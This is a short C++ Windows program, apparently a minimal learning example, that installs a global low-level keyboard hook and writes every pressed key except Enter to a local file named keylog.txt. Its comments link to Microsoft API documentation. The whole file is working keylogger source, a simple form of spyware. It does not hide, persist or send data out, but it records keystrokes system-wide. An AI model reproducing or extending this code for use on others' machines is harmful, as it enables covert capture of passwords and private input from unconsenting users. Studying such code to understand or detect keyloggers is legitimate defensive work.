#include <iostream>
#include <stdio.h>
#include <fstream>
#include <Windows.h>
using namespace std;

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
HHOOK keyboardhook;
ofstream textfile;
char key;

// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-kbdllhookstruct
LRESULT CALLBACK KeyboardProc(_In_ int code, _In_ WPARAM wParam, _In_ LPARAM lParam){
		
		// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-kbdllhookstruct
		LPKBDLLHOOKSTRUCT keypress = (LPKBDLLHOOKSTRUCT)lParam;

		if (code == HC_ACTION && wParam == WM_KEYDOWN){
			if (keypress->vkCode != VK_RETURN){
				// Saving vkCode (DWORD) to char
				key = keypress->vkCode;
				// Writing to text file
				textfile << key;
			}
		}

		// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-callnexthookex
		return CallNextHookEx(keyboardhook, code, wParam, lParam);
}

int main (){
	
	textfile.open("keylog.txt", ios::out | ios::trunc);

	printf("Hooking the keyboard...\n");

	// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa
	keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);

	MSG msg{ 0 };

	// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getmessage
	while (GetMessage(&msg, NULL, 0, 0) != 0);
	
	// https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-unhookwindowshookex
	UnhookWindowsHookEx(keyboardhook);

	textfile.close();

	return 0;
}